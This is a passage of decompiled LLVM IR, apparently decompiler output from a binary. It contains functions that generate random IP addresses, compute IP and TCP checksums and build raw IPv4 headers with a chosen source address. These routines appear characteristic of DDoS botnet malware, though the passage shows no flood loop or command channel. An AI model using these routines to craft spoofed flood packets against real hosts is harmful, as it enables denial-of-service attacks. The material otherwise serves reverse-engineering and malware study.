  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1b998.173 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1b978.169 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1b968.167 to i32), { 2, 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_1b938.161 to i32), { 1, 0 }
  uselistorder i8* @global_var_2687e.83, { 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_2687d.82, { 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_d7f0, { 1, 0 }
  uselistorder label %dec_label_pc_d7bc, { 1, 0 }
  uselistorder label %dec_label_pc_d788, { 1, 0 }
  uselistorder label %dec_label_pc_d754, { 1, 0 }
  uselistorder label %dec_label_pc_d720, { 1, 0 }
  uselistorder label %dec_label_pc_d6ec, { 1, 0 }
  uselistorder label %dec_label_pc_d6b8, { 1, 0 }
  uselistorder label %dec_label_pc_d650, { 1, 0 }
  uselistorder label %dec_label_pc_d61c, { 1, 0 }
  uselistorder label %dec_label_pc_d5e8, { 1, 0 }
  uselistorder label %dec_label_pc_d5b4, { 1, 0 }
  uselistorder label %dec_label_pc_d580, { 1, 0 }
  uselistorder label %dec_label_pc_d54c, { 1, 0 }
  uselistorder label %dec_label_pc_d518, { 1, 0 }
  uselistorder label %dec_label_pc_d4e4, { 1, 0 }
  uselistorder label %dec_label_pc_d4b0, { 1, 0 }
  uselistorder label %dec_label_pc_d47c, { 1, 0 }
  uselistorder label %dec_label_pc_d448, { 1, 0 }
  uselistorder label %dec_label_pc_d414, { 1, 0 }
  uselistorder label %dec_label_pc_d3e0, { 1, 0 }
  uselistorder label %dec_label_pc_d3ac, { 1, 0 }
  uselistorder label %dec_label_pc_d378, { 1, 0 }
  uselistorder label %dec_label_pc_d344, { 1, 0 }
  uselistorder label %dec_label_pc_d310, { 1, 0 }
  uselistorder label %dec_label_pc_d2dc, { 1, 0 }
  uselistorder label %dec_label_pc_d2a8, { 1, 0 }
  uselistorder label %dec_label_pc_d274, { 1, 0 }
  uselistorder label %dec_label_pc_d240, { 1, 0 }
  uselistorder label %dec_label_pc_d20c, { 1, 0 }
  uselistorder label %dec_label_pc_d1d8, { 1, 0 }
  uselistorder label %dec_label_pc_d1a4, { 1, 0 }
  uselistorder label %dec_label_pc_d170, { 1, 0 }
  uselistorder label %dec_label_pc_d13c, { 1, 0 }
  uselistorder label %dec_label_pc_d108, { 1, 0 }
  uselistorder label %dec_label_pc_d0d4, { 1, 0 }
  uselistorder label %dec_label_pc_d0a0, { 1, 0 }
  uselistorder label %dec_label_pc_d06c, { 1, 0 }
  uselistorder label %dec_label_pc_d038, { 1, 0 }
  uselistorder label %dec_label_pc_d004, { 1, 0 }
  uselistorder label %dec_label_pc_cfd0, { 1, 0 }
  uselistorder label %dec_label_pc_cf9c, { 1, 0 }
  uselistorder label %dec_label_pc_cf68, { 1, 0 }
  uselistorder label %dec_label_pc_cf34, { 1, 0 }
  uselistorder label %dec_label_pc_cf00, { 1, 0 }
  uselistorder label %dec_label_pc_cecc, { 1, 0 }
  uselistorder label %dec_label_pc_ce98, { 1, 0 }
  uselistorder label %dec_label_pc_ce64, { 1, 0 }
  uselistorder label %dec_label_pc_ce30, { 1, 0 }
  uselistorder label %dec_label_pc_cdfc, { 1, 0 }
  uselistorder label %dec_label_pc_cdc8, { 1, 0 }
  uselistorder label %dec_label_pc_cd94, { 1, 0 }
  uselistorder label %dec_label_pc_cd60, { 1, 0 }
  uselistorder label %dec_label_pc_cd2c, { 1, 0 }
  uselistorder label %dec_label_pc_ccf8, { 1, 0 }
  uselistorder label %dec_label_pc_ccc4, { 1, 0 }
  uselistorder label %dec_label_pc_cc90, { 1, 0 }
  uselistorder label %dec_label_pc_cc5c, { 1, 0 }
  uselistorder label %dec_label_pc_cc28, { 1, 0 }
  uselistorder label %dec_label_pc_cbf4, { 1, 0 }
  uselistorder label %dec_label_pc_cbc0, { 1, 0 }
  uselistorder label %dec_label_pc_cb8c, { 1, 0 }
  uselistorder label %dec_label_pc_cb58, { 1, 0 }
  uselistorder label %dec_label_pc_cb24, { 1, 0 }
  uselistorder label %dec_label_pc_caf0, { 1, 0 }
  uselistorder label %dec_label_pc_cabc, { 1, 0 }
  uselistorder label %dec_label_pc_ca88, { 1, 0 }
  uselistorder label %dec_label_pc_ca54, { 1, 0 }
  uselistorder label %dec_label_pc_ca20, { 1, 0 }
  uselistorder label %dec_label_pc_c9ec, { 1, 0 }
  uselistorder label %dec_label_pc_c9b8, { 1, 0 }
  uselistorder label %dec_label_pc_c984, { 1, 0 }
  uselistorder label %dec_label_pc_c950, { 1, 0 }
  uselistorder label %dec_label_pc_c91c, { 1, 0 }
  uselistorder label %dec_label_pc_c8e8, { 1, 0 }
  uselistorder label %dec_label_pc_c8b4, { 1, 0 }
  uselistorder label %dec_label_pc_c880, { 1, 0 }
  uselistorder label %dec_label_pc_c84c, { 1, 0 }
  uselistorder label %dec_label_pc_c818, { 1, 0 }
  uselistorder label %dec_label_pc_c7e4, { 1, 0 }
  uselistorder label %dec_label_pc_c7b0, { 1, 0 }
  uselistorder label %dec_label_pc_c77c, { 1, 0 }
  uselistorder label %dec_label_pc_c748, { 1, 0 }
  uselistorder label %dec_label_pc_c714, { 1, 0 }
  uselistorder label %dec_label_pc_c6e0, { 1, 0 }
  uselistorder label %dec_label_pc_c6ac, { 1, 0 }
  uselistorder label %dec_label_pc_c678, { 1, 0 }
  uselistorder label %dec_label_pc_c644, { 1, 0 }
  uselistorder label %dec_label_pc_c610, { 1, 0 }
  uselistorder label %dec_label_pc_c5dc, { 1, 0 }
  uselistorder label %dec_label_pc_c5a8, { 1, 0 }
  uselistorder label %dec_label_pc_c574, { 1, 0 }
  uselistorder label %dec_label_pc_c540, { 1, 0 }
  uselistorder label %dec_label_pc_c50c, { 1, 0 }
  uselistorder label %dec_label_pc_c4d8, { 1, 0 }
  uselistorder label %dec_label_pc_c4a4, { 1, 0 }
  uselistorder label %dec_label_pc_c470, { 1, 0 }
  uselistorder label %dec_label_pc_c43c, { 1, 0 }
  uselistorder label %dec_label_pc_c408, { 1, 0 }
  uselistorder label %dec_label_pc_c3d4, { 1, 0 }
  uselistorder label %dec_label_pc_c3a0, { 1, 0 }
  uselistorder label %dec_label_pc_c36c, { 1, 0 }
  uselistorder label %dec_label_pc_c338, { 1, 0 }
  uselistorder label %dec_label_pc_c304, { 1, 0 }
  uselistorder label %dec_label_pc_c2d0, { 1, 0 }
  uselistorder label %dec_label_pc_c29c, { 1, 0 }
  uselistorder label %dec_label_pc_c268, { 1, 0 }
  uselistorder label %dec_label_pc_c234, { 1, 0 }
  uselistorder label %dec_label_pc_c200, { 1, 0 }
  uselistorder label %dec_label_pc_c1cc, { 1, 0 }
  uselistorder label %dec_label_pc_c198, { 1, 0 }
  uselistorder label %dec_label_pc_c164, { 1, 0 }
  uselistorder label %dec_label_pc_c130, { 1, 0 }
  uselistorder label %dec_label_pc_c0fc, { 1, 0 }
  uselistorder label %dec_label_pc_c0c8, { 1, 0 }
  uselistorder label %dec_label_pc_c094, { 1, 0 }
  uselistorder label %dec_label_pc_c060, { 1, 0 }
  uselistorder label %dec_label_pc_c02c, { 1, 0 }
  uselistorder label %dec_label_pc_bff8, { 1, 0 }
  uselistorder label %dec_label_pc_bfc4, { 1, 0 }
  uselistorder label %dec_label_pc_bf90, { 1, 0 }
  uselistorder label %dec_label_pc_bf5c, { 1, 0 }
  uselistorder label %dec_label_pc_bf28, { 1, 0 }
  uselistorder label %dec_label_pc_bef4, { 1, 0 }
  uselistorder label %dec_label_pc_bec0, { 1, 0 }
  uselistorder label %dec_label_pc_be8c, { 1, 0 }
  uselistorder label %dec_label_pc_be58, { 1, 0 }
  uselistorder label %dec_label_pc_be24, { 1, 0 }
  uselistorder label %dec_label_pc_bdf0, { 1, 0 }
  uselistorder label %dec_label_pc_bdbc, { 1, 0 }
  uselistorder label %dec_label_pc_bd88, { 1, 0 }
  uselistorder label %dec_label_pc_bd54, { 1, 0 }
  uselistorder label %dec_label_pc_bd20, { 1, 0 }
  uselistorder label %dec_label_pc_bcec, { 1, 0 }
  uselistorder label %dec_label_pc_bcb8, { 1, 0 }
  uselistorder label %dec_label_pc_ba34, { 1, 0 }
  uselistorder label %dec_label_pc_ba00, { 1, 0 }
  uselistorder label %dec_label_pc_b9cc, { 1, 0 }
  uselistorder label %dec_label_pc_b998, { 1, 0 }
  uselistorder label %dec_label_pc_b964, { 1, 0 }
  uselistorder label %dec_label_pc_b930, { 1, 0 }
  uselistorder label %dec_label_pc_b8fc, { 1, 0 }
  uselistorder label %dec_label_pc_b8c8, { 1, 0 }
  uselistorder label %dec_label_pc_b894, { 1, 0 }
  uselistorder label %dec_label_pc_b860, { 1, 0 }
  uselistorder label %dec_label_pc_b82c, { 1, 0 }
  uselistorder label %dec_label_pc_b7f8, { 1, 0 }
  uselistorder label %dec_label_pc_b7c4, { 1, 0 }
  uselistorder label %dec_label_pc_b790, { 1, 0 }
  uselistorder label %dec_label_pc_b75c, { 1, 0 }
  uselistorder label %dec_label_pc_b728, { 1, 0 }
  uselistorder label %dec_label_pc_b6f4, { 1, 0 }
  uselistorder label %dec_label_pc_b6c0, { 1, 0 }
  uselistorder label %dec_label_pc_b68c, { 1, 0 }
  uselistorder label %dec_label_pc_b658, { 1, 0 }
  uselistorder label %dec_label_pc_b624, { 1, 0 }
  uselistorder label %dec_label_pc_b5f0, { 1, 0 }
  uselistorder label %dec_label_pc_b5bc, { 1, 0 }
  uselistorder label %dec_label_pc_b588, { 1, 0 }
  uselistorder label %dec_label_pc_b554, { 1, 0 }
  uselistorder label %dec_label_pc_b520, { 1, 0 }
  uselistorder label %dec_label_pc_b4ec, { 1, 0 }
  uselistorder label %dec_label_pc_b4b8, { 1, 0 }
  uselistorder label %dec_label_pc_b484, { 1, 0 }
  uselistorder label %dec_label_pc_b450, { 1, 0 }
  uselistorder label %dec_label_pc_b41c, { 1, 0 }
  uselistorder label %dec_label_pc_b3e8, { 1, 0 }
  uselistorder label %dec_label_pc_b3b4, { 1, 0 }
  uselistorder label %dec_label_pc_b380, { 1, 0 }
  uselistorder label %dec_label_pc_b34c, { 1, 0 }
  uselistorder label %dec_label_pc_b318, { 1, 0 }
  uselistorder label %dec_label_pc_b2e4, { 1, 0 }
  uselistorder label %dec_label_pc_b2b0, { 1, 0 }
  uselistorder label %dec_label_pc_b27c, { 1, 0 }
  uselistorder label %dec_label_pc_b248, { 1, 0 }
  uselistorder label %dec_label_pc_b214, { 1, 0 }
  uselistorder label %dec_label_pc_b1e0, { 1, 0 }
  uselistorder label %dec_label_pc_b1ac, { 1, 0 }
  uselistorder label %dec_label_pc_b178, { 1, 0 }
  uselistorder label %dec_label_pc_b144, { 1, 0 }
  uselistorder label %dec_label_pc_b110, { 1, 0 }
  uselistorder label %dec_label_pc_b0dc, { 1, 0 }
  uselistorder label %dec_label_pc_b0a8, { 1, 0 }
  uselistorder label %dec_label_pc_b074, { 1, 0 }
  uselistorder label %dec_label_pc_b040, { 1, 0 }
  uselistorder label %dec_label_pc_b00c, { 1, 0 }
  uselistorder label %dec_label_pc_afd8, { 1, 0 }
  uselistorder label %dec_label_pc_afa4, { 1, 0 }
  uselistorder label %dec_label_pc_af70, { 1, 0 }
  uselistorder label %dec_label_pc_af3c, { 1, 0 }
  uselistorder label %dec_label_pc_af08, { 1, 0 }
  uselistorder label %dec_label_pc_aed4, { 1, 0 }
  uselistorder label %dec_label_pc_aea0, { 1, 0 }
  uselistorder label %dec_label_pc_ae6c, { 1, 0 }
  uselistorder label %dec_label_pc_ae38, { 1, 0 }
  uselistorder label %dec_label_pc_ae04, { 1, 0 }
  uselistorder label %dec_label_pc_add0, { 1, 0 }
  uselistorder label %dec_label_pc_ad9c, { 1, 0 }
  uselistorder label %dec_label_pc_ad68, { 1, 0 }
  uselistorder label %dec_label_pc_ad34, { 1, 0 }
  uselistorder label %dec_label_pc_ad00, { 1, 0 }
  uselistorder label %dec_label_pc_accc, { 1, 0 }
  uselistorder label %dec_label_pc_ac98, { 1, 0 }
  uselistorder label %dec_label_pc_ac64, { 1, 0 }
  uselistorder label %dec_label_pc_ac30, { 1, 0 }
  uselistorder label %dec_label_pc_abfc, { 1, 0 }
  uselistorder label %dec_label_pc_abc8, { 1, 0 }
  uselistorder label %dec_label_pc_ab94, { 1, 0 }
}

define i32 @GetRandomIP(i32 %arg1) local_unnamed_addr {
entry:
  %v3_d924 = load i32, i32* @fp, align 4
  %v2_d938 = load i32, i32* @global_var_2cae0.485, align 4
  %v1_d940 = call i32 @ntohl(i32 %v2_d938)
  %v2_d94c = and i32 %v1_d940, %arg1
  %v0_d954 = call i32 @rand_cmwc()
  %v1_d960 = sub i32 -1, %arg1
  %v2_d964 = and i32 %v0_d954, %v1_d960
  %v2_d96c = xor i32 %v2_d964, %v2_d94c
  store i32 %v3_d924, i32* @fp, align 4
  ret i32 %v2_d96c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @csum(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v8_d9fc9 = icmp sgt i32 %arg2, 1
  br i1 %v8_d9fc9, label %dec_label_pc_d9ac, label %dec_label_pc_da00

dec_label_pc_d9ac:                                ; preds = %entry, %dec_label_pc_d9ac
  %v2_d9c8 = phi i32 [ %v2_d9cc, %dec_label_pc_d9ac ], [ 0, %entry ]
  %stack_var_-40.012 = phi i32 [ %v5_d9d0, %dec_label_pc_d9ac ], [ 0, %entry ]
  %stack_var_-36.011 = phi i32 [ %v1_d9ec, %dec_label_pc_d9ac ], [ %arg2, %entry ]
  %stack_var_-32.010 = phi i8* [ %v5_d9e4, %dec_label_pc_d9ac ], [ %arg1, %entry ]
  %v4_d9ac = ptrtoint i8* %stack_var_-32.010 to i32
  %v2_d9b0 = load i8, i8* %stack_var_-32.010, align 1
  %v3_d9b0 = zext i8 %v2_d9b0 to i32
  %v1_d9b4 = add i32 %v4_d9ac, 1
  %v2_d9b4 = inttoptr i32 %v1_d9b4 to i8*
  %v3_d9b4 = load i8, i8* %v2_d9b4, align 1
  %v4_d9b4 = zext i8 %v3_d9b4 to i32
  %v4_d9b8 = mul nuw nsw i32 %v4_d9b4, 256
  %v5_d9b8 = or i32 %v4_d9b8, %v3_d9b0
  %v2_d9cc = add i32 %v5_d9b8, %v2_d9c8
  %v3_d9cc = icmp ult i32 %v2_d9cc, %v2_d9c8
  %v4_d9d0 = zext i1 %v3_d9cc to i32
  %v5_d9d0 = add i32 %v4_d9d0, %stack_var_-40.012
  %v1_d9e0 = add i32 %v4_d9ac, 2
  %v5_d9e4 = inttoptr i32 %v1_d9e0 to i8*
  %v1_d9ec = add nsw i32 %stack_var_-36.011, -2
  %v8_d9fc = icmp sgt i32 %v1_d9ec, 1
  br i1 %v8_d9fc, label %dec_label_pc_d9ac, label %dec_label_pc_da00

dec_label_pc_da00:                                ; preds = %dec_label_pc_d9ac, %entry
  %v2_da20 = phi i32 [ 0, %entry ], [ %v2_d9cc, %dec_label_pc_d9ac ]
  %stack_var_-32.0.lcssa = phi i8* [ %arg1, %entry ], [ %v5_d9e4, %dec_label_pc_d9ac ]
  %stack_var_-40.0.lcssa = phi i32 [ 0, %entry ], [ %v5_d9d0, %dec_label_pc_d9ac ]
  %v7_d9f8.lcssa.in = phi i32 [ %arg2, %entry ], [ %v1_d9ec, %dec_label_pc_d9ac ]
  %v7_d9f8.lcssa = icmp eq i32 %v7_d9f8.lcssa.in, 1
  br i1 %v7_d9f8.lcssa, label %dec_label_pc_da0c, label %dec_label_pc_da88.preheader

dec_label_pc_da0c:                                ; preds = %dec_label_pc_da00
  %v2_da10 = load i8, i8* %stack_var_-32.0.lcssa, align 1
  %v3_da10 = zext i8 %v2_da10 to i32
  %v2_da24 = add i32 %v3_da10, %v2_da20
  %v3_da24 = icmp ult i32 %v2_da24, %v2_da20
  %v4_da28 = zext i1 %v3_da24 to i32
  %v5_da28 = add i32 %v4_da28, %stack_var_-40.0.lcssa
  br label %dec_label_pc_da88.preheader

dec_label_pc_da88.preheader:                      ; preds = %dec_label_pc_da0c, %dec_label_pc_da00
  %v3_dab4.ph = phi i32 [ %v2_da20, %dec_label_pc_da00 ], [ %v2_da24, %dec_label_pc_da0c ]
  %stack_var_-40.1.ph = phi i32 [ %stack_var_-40.0.lcssa, %dec_label_pc_da00 ], [ %v5_da28, %dec_label_pc_da0c ]
  %v3_da8c36 = mul i32 %stack_var_-40.1.ph, 65536
  %v3_da9437 = udiv i32 %v3_dab4.ph, 65536
  %v2_da9838 = or i32 %v3_da8c36, %v3_da9437
  %v3_daa039 = udiv i32 %stack_var_-40.1.ph, 65536
  %v2_daa840 = or i32 %v2_da9838, %v3_daa039
  %v2_daac41 = icmp eq i32 %v2_daa840, 0
  br i1 %v2_daac41, label %dec_label_pc_dab4, label %dec_label_pc_da38

dec_label_pc_da38:                                ; preds = %dec_label_pc_da88.preheader, %dec_label_pc_da38
  %v3_daa044 = phi i32 [ %v3_daa0, %dec_label_pc_da38 ], [ %v3_daa039, %dec_label_pc_da88.preheader ]
  %v2_da9843 = phi i32 [ %v2_da98, %dec_label_pc_da38 ], [ %v2_da9838, %dec_label_pc_da88.preheader ]
  %v3_dab442 = phi i32 [ %v2_da78, %dec_label_pc_da38 ], [ %v3_dab4.ph, %dec_label_pc_da88.preheader ]
  %v2_da4c = urem i32 %v3_dab442, 65536
  %v2_da78 = add i32 %v2_da9843, %v2_da4c
  %v3_da78 = icmp ult i32 %v2_da78, %v2_da4c
  %v4_da7c = zext i1 %v3_da78 to i32
  %v5_da7c = add nuw nsw i32 %v4_da7c, %v3_daa044
  %v3_da8c = mul i32 %v5_da7c, 65536
  %v3_da94 = udiv i32 %v2_da78, 65536
  %v2_da98 = or i32 %v3_da8c, %v3_da94
  %v3_daa0 = udiv i32 %v5_da7c, 65536
  %v2_daa8 = or i32 %v2_da98, %v3_daa0
  %v2_daac = icmp eq i32 %v2_daa8, 0
  br i1 %v2_daac, label %dec_label_pc_da88.dec_label_pc_dab4_crit_edge, label %dec_label_pc_da38

dec_label_pc_da88.dec_label_pc_dab4_crit_edge:    ; preds = %dec_label_pc_da38
  br label %dec_label_pc_dab4

dec_label_pc_dab4:                                ; preds = %dec_label_pc_da88.dec_label_pc_dab4_crit_edge, %dec_label_pc_da88.preheader
  %v3_dab4.lcssa = phi i32 [ %v2_da78, %dec_label_pc_da88.dec_label_pc_dab4_crit_edge ], [ %v3_dab4.ph, %dec_label_pc_da88.preheader ]
  %v1_dac0 = urem i32 %v3_dab4.lcssa, 65536
  %v3_dac8 = xor i32 %v1_dac0, 65535
  ret i32 %v3_dac8

; uselistorder directives
  uselistorder i32 %v2_da98, { 1, 0 }
  uselistorder i32 %v5_da7c, { 1, 0 }
  uselistorder i32 %v2_da78, { 2, 0, 3, 1 }
  uselistorder i32 %v3_daa039, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.ph, { 1, 0 }
  uselistorder i32 %v3_dab4.ph, { 2, 1, 0 }
  uselistorder i32 %v2_da20, { 0, 2, 1 }
  uselistorder i32 %v1_d9ec, { 0, 2, 1 }
  uselistorder i32 %v2_d9cc, { 0, 2, 1 }
  uselistorder i32 %v2_d9c8, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_da38, { 1, 0 }
  uselistorder label %dec_label_pc_d9ac, { 1, 0 }
}

define i32 @tcpcsum(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_dadc = load i32, i32* @fp, align 4
  store i32 %arg2, i32* %stack_var_-52, align 4
  %v1_db14 = add i32 %arg1, 12
  %v2_db14 = inttoptr i32 %v1_db14 to i32*
  %v3_db14 = load i32, i32* %v2_db14, align 4
  store i32 %v3_db14, i32* %stack_var_-44, align 4
  %v1_db3c = call i32 @htons(i32 20)
  %v1_db60 = call i32 @malloc(i32 32)
  %v2_db70 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v1_db60, i32* @r0, align 4
  store i32 %v2_db70, i32* @r1, align 4
  store i32 12, i32* @r2, align 4
  %v0_db84 = call i32 @memcpy()
  %v1_db8c = add i32 %v1_db60, 12
  %v3_db90 = load i32, i32* %stack_var_-52, align 4
  store i32 %v1_db8c, i32* @r0, align 4
  store i32 %v3_db90, i32* @r1, align 4
  store i32 20, i32* @r2, align 4
  %v0_dba4 = call i32 @memcpy()
  %v2_dbb0 = inttoptr i32 %v1_db60 to i8*
  %v3_dbb0 = call i32 @csum(i8* %v2_dbb0, i32 32)
  %sext2 = mul i32 %v3_dbb0, 16777216
  %v3_dbbc = ashr i32 %sext2, 31
  store i32 %v1_db60, i32* @r0, align 4
  %v0_dbc8 = call i32 @free()
  %v3_dbd0 = sdiv i32 %sext2, 16777216
  %v4_dbd4 = mul nsw i32 %v3_dbbc, 256
  %v4_dbd8 = and i32 %v4_dbd4, 65280
  %v5_dbd8 = or i32 %v4_dbd8, %v3_dbd0
  store i32 %v3_dadc, i32* @fp, align 4
  ret i32 %v5_dbd8

; uselistorder directives
  uselistorder i32 %sext2, { 1, 0 }
  uselistorder i32 %v1_db60, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
}

define i32 @makeIPPacket(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = trunc i32 %arg4 to i8
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp4 = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v3_dbec = load i32, i32* @fp, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  %v2_dc0c = load i8, i8* %arg1, align 1
  %v4_dc14 = zext i8 %v2_dc0c to i32
  %v1_dc18 = and i32 %v4_dc14, 240
  %v1_dc1c = or i32 %v1_dc18, 5
  store i32 %v1_dc1c, i32* %r3.global-to-local, align 4
  %v1_dc28 = trunc i32 %v1_dc1c to i8
  store i8 %v1_dc28, i8* %arg1, align 1
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i8 69, i8* %arg1, align 1
  %v3_dc58 = add i32 %tmp4, 1
  %v4_dc58 = inttoptr i32 %v3_dc58 to i8*
  store i8 0, i8* %v4_dc58, align 1
  %v3_dc5c = load i32, i32* %stack_var_0, align 4
  %fold = add i32 %v3_dc5c, 20
  %v3_dc70 = urem i32 %fold, 65536
  store i32 %v3_dc70, i32* %r3.global-to-local, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  %v1_dc78 = trunc i32 %fold to i8
  %v3_dc78 = add i32 %tmp4, 2
  %v4_dc78 = inttoptr i32 %v3_dc78 to i8*
  store i8 %v1_dc78, i8* %v4_dc78, align 1
  %v0_dc7c = load i32, i32* %r3.global-to-local, align 4
  %v3_dc7c = sdiv i32 %v0_dc7c, 256
  store i32 %v3_dc7c, i32* %r3.global-to-local, align 4
  %v1_dc80 = trunc i32 %v3_dc7c to i8
  %v2_dc80 = load i32, i32* %r2.global-to-local, align 4
  %v3_dc80 = add i32 %v2_dc80, 3
  %v4_dc80 = inttoptr i32 %v3_dc80 to i8*
  store i8 %v1_dc80, i8* %v4_dc80, align 1
  %v0_dc84 = call i32 @rand_cmwc()
  %v3_dc90 = urem i32 %v0_dc84, 65536
  store i32 %v3_dc90, i32* %r3.global-to-local, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  %v1_dc98 = trunc i32 %v0_dc84 to i8
  %v3_dc98 = add i32 %tmp4, 4
  %v4_dc98 = inttoptr i32 %v3_dc98 to i8*
  store i8 %v1_dc98, i8* %v4_dc98, align 1
  %v0_dc9c = load i32, i32* %r3.global-to-local, align 4
  %v3_dc9c3 = udiv i32 %v0_dc9c, 256
  %v1_dca0 = trunc i32 %v3_dc9c3 to i8
  %v2_dca0 = load i32, i32* %r2.global-to-local, align 4
  %v3_dca0 = add i32 %v2_dca0, 5
  %v4_dca0 = inttoptr i32 %v3_dca0 to i8*
  store i8 %v1_dca0, i8* %v4_dca0, align 1
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_dcac = add i32 %tmp4, 6
  %v4_dcac = inttoptr i32 %v3_dcac to i8*
  store i8 0, i8* %v4_dcac, align 1
  %v0_dcb0 = load i32, i32* %r3.global-to-local, align 4
  %v1_dcb0 = trunc i32 %v0_dcb0 to i8
  %v2_dcb0 = load i32, i32* %r2.global-to-local, align 4
  %v3_dcb0 = add i32 %v2_dcb0, 7
  %v4_dcb0 = inttoptr i32 %v3_dcb0 to i8*
  store i8 %v1_dcb0, i8* %v4_dcb0, align 1
  %v3_dcbc = add i32 %tmp4, 8
  %v4_dcbc = inttoptr i32 %v3_dcbc to i8*
  store i8 -1, i8* %v4_dcbc, align 1
  %v3_dcc8 = add i32 %tmp4, 9
  %v4_dcc8 = inttoptr i32 %v3_dcc8 to i8*
  store i8 %tmp, i8* %v4_dcc8, align 1
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_dcd4 = add i32 %tmp4, 10
  %v4_dcd4 = inttoptr i32 %v3_dcd4 to i8*
  store i8 0, i8* %v4_dcd4, align 1
  %v0_dcd8 = load i32, i32* %r3.global-to-local, align 4
  %v1_dcd8 = trunc i32 %v0_dcd8 to i8
  %v2_dcd8 = load i32, i32* %r2.global-to-local, align 4
  %v3_dcd8 = add i32 %v2_dcd8, 11
  %v4_dcd8 = inttoptr i32 %v3_dcd8 to i8*
  store i8 %v1_dcd8, i8* %v4_dcd8, align 1
  %v2_dce4 = add i32 %tmp4, 12
  %v3_dce4 = inttoptr i32 %v2_dce4 to i32*
  store i32 %arg3, i32* %v3_dce4, align 4
  store i32 %tmp4, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_dcf0 = add i32 %tmp4, 16
  %v3_dcf0 = inttoptr i32 %v2_dcf0 to i32*
  store i32 %arg2, i32* %v3_dcf0, align 4
  store i32 %v3_dbec, i32* @fp, align 4
  ret i32 %v0_dc84

; uselistorder directives
  uselistorder i32 %v0_dc84, { 1, 2, 0 }
  uselistorder i32 %v3_dc7c, { 1, 0 }
  uselistorder i32 %fold, { 1, 0 }
  uselistorder i32 %tmp4, { 1, 0, 2, 4, 3, 5, 6, 8, 7, 10, 9, 12, 11, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 %arg4, { 1, 0 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v8_dd18 = icmp sgt i32 %arg1, 2
  br i1 %v8_dd18, label %dec_label_pc_dd28, label %dec_label_pc_dd38

dec_label_pc_dd28:                                ; preds = %entry
